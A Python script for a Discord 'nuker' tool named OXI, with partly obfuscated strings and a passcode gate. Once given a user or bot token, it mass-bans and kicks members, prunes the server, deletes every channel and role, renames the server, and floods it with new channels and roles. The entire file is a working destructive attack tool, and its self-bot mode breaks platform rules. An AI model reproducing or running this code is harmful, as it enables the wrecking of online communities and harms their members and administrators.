#good job you cracked it pls dont skid cuz the only reason i obfuscated is so nobody skids

import discord
import requests
import os
import threading
import string
import random
import time
import json
import asyncio
import aiohttp

from pypresence import Presence
from threading import Thread
from discord.utils import find, get
from discord.ext import commands
from time import strftime, gmtime
from discord import Webhook, AsyncWebhookAdapter


#do not delete it will make the whole nuker broken
SecToLen = ("\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0067\u0067\u002e\u0067\u0067\u002f\u004f\u0078\u0069\u0043\u0072\u0065\u0064\u0069\u0074\u0073")
#do not delete it will make the whole nuker broken



os.system('clear')

with open('config.json') as f:
    config = json.load(f)

print(SecToLen)
token = input(f"\x1b[38;5;15mToken\x1b[38;5;14m(): ")
prefix = input(f"\x1b[38;5;15mPrefix\x1b[38;5;14m(): ")


channel_names = config.get('ChannelName')
#balls
server_names = config.get('Server-Names')
#balls
role_names = config.get('RoleName')
#balls
reason = config.get('Reason')
#balls
import time
from time import sleep

import os
import sys


def clear(): os.system('clear') #on Linux Syst

print("\n\u005b\u004f\u0058\u0049\u005d\u003a \u0045\u006e\u0074\u0065\u0072 \u0050\u0061\u0073\u0073\u0063\u006f\u0064\u0065")
OxiKey = input("\x1b[38;5;15mNukerPasscode\x1b[38;5;14m(): ")

trys = 0;
while OxiKey != "\u004f\u0078\u0069\u0049\u0073\u0042\u0065\u0073\u0074":

 if trys > 3:
     sys.exit('''
     
     
     
\u25aa   \u2590 \u2584  \u2584\u2584\u00b7       \u2584\u2584\u2584  \u2584\u2584\u2584  \u2584\u2584\u2584 \u002e \u2584\u2584\u00b7 \u2584\u2584\u2584\u2584\u2584
\u2588\u2588 \u2022\u2588\u258c\u2590\u2588\u2590\u2588 \u258c\u25aa\u25aa     \u2580\u2584 \u2588\u00b7\u2580\u2584 \u2588\u00b7\u2580\u2584\u002e\u2580\u00b7\u2590\u2588 \u258c\u25aa\u2022\u2588\u2588  
\u2590\u2588\u00b7\u2590\u2588\u2590\u2590\u258c\u2588\u2588 \u2584\u2584 \u2584\u2588\u2580\u2584 \u2590\u2580\u2580\u2584 \u2590\u2580\u2580\u2584 \u2590\u2580\u2580\u25aa\u2584\u2588\u2588 \u2584\u2584 \u2590\u2588\u002e\u25aa
\u2590\u2588\u258c\u2588\u2588\u2590\u2588\u258c\u2590\u2588\u2588\u2588\u258c\u2590\u2588\u258c\u002e\u2590\u258c\u2590\u2588\u2022\u2588\u258c\u2590\u2588\u2022\u2588\u258c\u2590\u2588\u2584\u2584\u258c\u2590\u2588\u2588\u2588\u258c \u2590\u2588\u258c\u00b7
\u2580\u2580\u2580\u2580\u2580 \u2588\u25aa\u00b7\u2580\u2580\u2580  \u2580\u2588\u2584\u2580\u25aa\u002e\u2580  \u2580\u002e\u2580  \u2580 \u2580\u2580\u2580 \u00b7\u2580\u2580\u2580  \u2580\u2580\u2580 
           \x73\x6b\x69\x64 \x62\x6f\x79 \x77\x68\x61\x74 \x75 \x64\x6f\x69\x6e\x67
     
     ''')

 OxiKey = input("\x1b[38;5;15mNukerPasscodeRetry\x1b[38;5;14m(): ")
 trys += 1
 clear()
 print("\x1b[38;5;15mAttempts\x1b[38;5;14m(): ")
 print(trys)

print("[OXI]: Loading Oxi...")

def check_token(token: str) -> str:
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": token}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token(token)

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True)
else:
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False)
    
client.remove_command("help")
                
class OXI:
    
    def Name(guild):
        try:

            json = {
                'name': random.choice(server_names),
            }
            r = requests.patch(f'https://discord.com/api/v8/guilds/{guild}', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"[OXI]: Named Server")
            else:
                print(f"[OXI]: RateLimit")
        except:
            pass





    def Ban(guild, member):
        try:
            json = {
                'delete_message_days': '7',
                'reason': f'{random.choice(reason)}'
            }
            r = requests.put(f'https://discord.com/api/v8/guilds/{guild}/bans/{member}', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"[OXI]: Banned Member")
            else:
                print(f"[OXI]: RateLimit")
        except:
            pass
    
    def Kick(guild, member):
        try:
            json = {
                'reason': f'{random.choice(reason)}'
            }
            r = requests.delete(f'https://discord.com/api/v8/guilds/{guild}/members/{member}', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"[OXI]: Kicked Member")
            else:
                print(f"[OXI]: RateLimit")
        except:
            pass

    def DelChannel(guild, channel):
        try:
            r = requests.delete(f'https://discord.com/api/v8/channels/{channel}', headers=headers)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
              print("sus")
            else:
                print(f"")
        except:
            pass

## WEBHOOK SPAMMER IN DEVELOPING OXI

    def CreateChannel(guild):
        try:
            json = {
                'name': random.choice(channel_names),
                'type': 0
            }
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"")
                if Spam == True:
                    webhook = OXI.CreateWebhook(r.json()['id'])
                    Thread(target=OXI.SendWebhook, args=(webhook,)).start()
            else:
                print(f"[OXI]: Sent Webhook")
        except:
            pass

    def DelRole(guild, role):
        try:
            r = requests.delete(f'https://discord.com/api/v8/guilds/{guild}/roles/{role}', headers=headers)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"[OXI]: Role Removed")
            else:
                print(f"[OXI]: Ratelimit")
        except:
            pass

    def CreateRole(guild):

        try:
            json = {
                'hoist': 'true',
                'name': random.choice(role_names),
                'mentionable': 'true',
                'color': random.randint(1000000,9999999),
                'permissions': random.randint(1,10)
            }
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"[OXI]: Role Created")
            else:
                print(f"[OXI]: RateLimit")
        except:
            pass
SecToLen = ("\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0067\u0067\u002e\u0067\u0067\u002f\u004f\u0078\u0069\u0043\u0072\u0065\u0064\u0069\u0074\u0073")
async def menu():
    os.system(f'clear')
    print(f'''
                               \x1b[38;5;15m
      ▐▄• ▄ ▪  
▪      █▌█▌▪██ 
 ▄█▀▄  ·██· ▐█·    
▐█▌.▐▌▪▐█·█▌▐█▌
 ▀█▄▀▪•▀▀ ▀▀▀▀▀       


──────⊱⁜⊰──────


\x1b[38;5;15m(): \x1b[38;5;14mtype ban to massban   

\x1b[38;5;15m(): \x1b[38;5;14mtype del to delete channels  

\x1b[38;5;15m(): \x1b[38;5;14mtype make to spam channels 

\x1b[38;5;15m(): \x1b[38;5;14mtype role to spam roles 

\x1b[38;5;15m(): \x1b[38;5;14mtype drole to delete roles  

\x1b[38;5;15m(): \x1b[38;5;14mtype scrape to scrape

    ''')
    print(SecToLen)
    choice = input("\x1b[38;5;14moxi\x1b[38;5;7m@\x1b[38;5;14m>")


    if choice == "ban":
        guildID = int(input("\x1b[38;5;14mGuild Id:\x1b[38;5;7m@\x1b[38;5;14m>"))
        try:
            guild = client.get_guild(guildID)
        except:
            print("\x1b[38;5;15Invalid ID")
            await menu()

        print(f'\n\x1b[38;5;14Fail Oxi Error 505\x1b[38;5;7m@\x1b[38;5;14m>')
        
        mainMembers = []
        num = 0
        
        with open("OXISCRAPE/members.txt", "r") as f:
            ids = f.readlines()

            for id in ids:
                mainMembers.append(id)

        members_1 = []
        members_2 = []
        members_3 = []
        total = len(mainMembers)
        members_per_arrary = round(total/3)
        
        for member in mainMembers:
            if len(members_1) != members_per_arrary:
                members_1.append(member)
            else:
                if len(members_2) != members_per_arrary:
                    members_2.append(member)
                else:
                    if len(members_3) != members_per_arrary:
                        members_3.append(member)
                    else:
                        pass
        while True:
            #try:
            Thread(target=OXI.Ban, args=(guild.id, members_1[num],)).start()
            Thread(target=OXI.Ban, args=(guild.id, members_2[num],)).start()
            Thread(target=OXI.Ban, args=(guild.id, members_3[num],)).start()
            num += 1
            #except IndexError:
                #break
            #except:
                #pass

        time.sleep(2)
        await menu()

    if choice == "kick":
        guildID = int(input("\x1b[38;5;14mGuild Id:\x1b[38;5;7m@\x1b[38;5;14m>"))
        try:
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'Kick Wave Launching...')

        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)
        
        mainMembers2 = []
        num2 = 0
        
        with open("OXISCRAPE/members.txt", "r") as f:
            ids = f.readlines()

            for id in ids:
                mainMembers2.append(id)

        members_11 = []
        members_22 = []
        members_33 = []
        total = len(mainMembers2)
        members_per_arrary = round(total/3)
        
        for member in mainMembers:
            if len(members_11) != members_per_arrary:
                members_11.append(member)
            else:
                if len(members_22) != members_per_arrary:
                    members_22.append(member)
                else:
                    if len(members_33) != members_per_arrary:
                        members_33.append(member)
                    else:
                        pass
        while True:
            try:
                Thread(target=OXI.Kick, args=(guild.id, members_11[num2],)).start()
                Thread(target=OXI.Kick, args=(guild.id, members_22[num2],)).start()
                Thread(target=OXI.Kick, args=(guild.id, members_33[num2],)).start()
                num2 += 1
            except IndexError:
                break
            except:
                pass

        time.sleep(2)
        await menu()

    if choice == "3":
        guildID = int(input("\x1b[38;5;14mGuild Id:\x1b[38;5;7m@\x1b[38;5;14m>"))
        try:
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'Prune Launch...')
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)
        await menu()

    if choice == "drole":
        guildID = int(input("\x1b[38;5;14mGuild Id:\x1b[38;5;7m@\x1b[38;5;14m>"))
        try:    
            guild = client.get_guild(guildID)
        except:
            print("\x1b[38;5;15mInvalid Id")
            await menu()


        
        rnum = 0
        roles = []
        
        with open("OXISCRAPE/roles.txt", "r") as f:
            rids = f.readlines()

            for id in rids:
                roles.append(id)

        while True:
            try:
                Thread(target=OXI.DelRole, args=(guild.id, roles[rnum],)).start()
                rnum += 1
            except IndexError:
                break
            except:
                pass

        time.sleep(2)
        await menu()

    if choice == "del":
        guildID = int(input("\x1b[38;5;14mGuild Id:\x1b[38;5;7m@\x1b[38;5;14m>"))
        try:    
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild Id:")
            await menu()


        
        cnum = 0
        channels = []

        with open("OXISCRAPE/channels.txt", "r") as f:
            cids = f.readlines()

            for id in cids:
                channels.append(id)

        while True:
            try:
                Thread(target=OXI.DelChannel, args=(guild.id, channels[cnum],)).start()
                cnum += 1
            except IndexError:
                break
            except:
                pass

        time.sleep(2)
        await menu()

    if choice == "nuke":
        guildID = int(input("\x1b[38;5;14mGuild Id:\x1b[38;5;7m@\x1b[38;5;14m>"))
        role_amount = int(input("\x1b[38;5;14roleamount\x1b[38;5;7m@\x1b[38;5;14m>"))
        channel_amount = int(input("\x1b[38;5;14channelamount\x1b[38;5;7m@\x1b[38;5;14m>"))
        try:    
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Nuking..')
        
        mainMembers3 = []
        num3 = 0
        
        with open("OXISCRAPE/members.txt", "r") as f:
            ids = f.readlines()

            for id in ids:
                mainMembers3.append(id)

        members_111 = []
        members_222 = []
        members_333 = []
        total = len(mainMembers3)
        members_per_arrary = round(total/3)
        
        for member in mainMembers3:
            if len(members_111) != members_per_arrary:
                members_111.append(member)
            else:
                if len(members_222) != members_per_arrary:
                    members_222.append(member)
                else:
                    if len(members_333) != members_per_arrary:
                        members_333.append(member)
                    else:
                        pass
        while True:
            try:
                Thread(target=OXI.Ban, args=(guild.id, members_111[num3],)).start()
                Thread(target=OXI.Ban, args=(guild.id, members_222[num3],)).start()
                Thread(target=OXI.Ban, args=(guild.id, members_333[num3],)).start()
                num3 += 1
            except IndexError:
                break
            except:
                pass

        OXI.Name(guild.id)

        cnum = 0
        channels = []
        
        with open("OXISCRAPE/channels.txt", "r") as f:
            cids = f.readlines()

            for id in cids:
                channels.append(id)

        while True:
            try:
                Thread(target=OXI.DelChannel, args=(guild.id, channels[cnum],)).start()
                cnum += 1
            except IndexError:
                break
            except:
                pass

        for i in range(channel_amount):
            Thread(target=OXI.CreateChannel, args=(guild.id,)).start()

        rnum = 0
        roles = []
        
        with open("OXISCRAPE/roles.txt", "r") as f:
            rids = f.readlines()

            for id in rids:
                roles.append(id)

        while True:
            try:
                Thread(target=OXI.DelRole, args=(guild.id, roles[rnum],)).start()
                rnum += 1
            except IndexError:
                break
            except:
                pass

        for i in range(role_amount):
            Thread(target=OXI.CreateRole, args=(guild.id,)).start()
        
        time.sleep(2)
        await menu()

    if choice == "role":
        guildID = int(input("\x1b[38;5;14mGuild Id:\x1b[38;5;7m@\x1b[38;5;14m>"))
        role_amount = int(input("\x1b[38;5;14mAmount\x1b[38;5;7m@\x1b[38;5;14m>"))
        try:    
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Creating Roles..')
        

        for i in range(role_amount):
            Thread(target=OXI.CreateRole, args=(guild.id,)).start()

        time.sleep(2)
        await menu()

    if choice == "make":
        guildID = int(input("\x1b[38;5;14mGuild Id:\x1b[38;5;7m@\x1b[38;5;14m>"))
        channel_amount = int(input("\x1b[38;5;14mAmount\x1b[38;5;7m@\x1b[38;5;14m>"))
        try:    
            guild = client.get_guild(guildID)
        except:
            print("\x1b[38;5;15mInvalid Id")
            await menu()

        print(f'\x1b[38;5;14mAmount\x1b[38;5;7m@\x1b[38;5;14m>')
        

        for i in range(channel_amount):
            Thread(target=OXI.CreateChannel, args=(guild.id,)).start()
        
        time.sleep(2)
        await menu()

    if choice == "scrape":
        print(f'\x1b[38;5;14m TYPE \x1b[38;5;7m\x1b[38;5;14m>{prefix}scrape\x1b[38;5;14m in the Guild that you want to Scrape.\n')

try:
    RPC = Presence("801856024088281088") 
    RPC.connect() 

    RPC.update(details="Main Menu", large_image="OXI", small_image="OXI", large_text="OXI", start=time.time())
except:
    pass

@client.event
async def on_ready():
    if token_type == "bot":
        try:
            await menu()
        except:
            pass

@client.event
async def on_connect():
    if token_type == "user":
        try:
            await menu()
        except:
            pass

@client.command()
async def scrape(ctx):
    await ctx.message.delete()

    try:
        os.remove("OXISCRAPE/members.txt")
        os.remove("OXISCRAPE/channels.txt")
        os.remove("OXISCRAPE/roles.txt")
    except:
        pass

    membercount = 0
    with open('OXISCRAPE/members.txt', 'a') as f:
        for member in ctx.guild.members:
            f.write(str(member.id) + "\n")
            membercount += 1
        print(f"\x1b[38;5;14mScraped \x1b[38;5;7mMembers")

    channelcount = 0
    with open('OXISCRAPE/channels.txt', 'a') as f:
        for channel in ctx.guild.channels:
            f.write(str(channel.id) + "\n")
            channelcount += 1
        print(f"\x1b[38;5;14mScraped \x1b[38;5;7mChannels")

    rolecount = 0
    with open('OXISCRAPE/roles.txt', 'a') as f:
        for role in ctx.guild.roles:
            f.write(str(role.id) + "\n")
            rolecount += 1
        print(f"\x1b[38;5;14mScraped \x1b[38;5;7mRoles")

    time.sleep(2)
    await menu()

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        pass

def Startup():
    if token_type == "user":
        try:
            client.run(token, bot=False)
        except:
            print(f"[OXI]: Failed Loading Token")
            input()
            os._exit(0)

    elif token_type == "bot":
        try:
            client.run(token)
        except:
            print(f"[OXI]: Failed Loading Token")
            input()
            os._exit(0)
    else:
        os._exit(0)

if __name__ == "__main__":
    Startup()
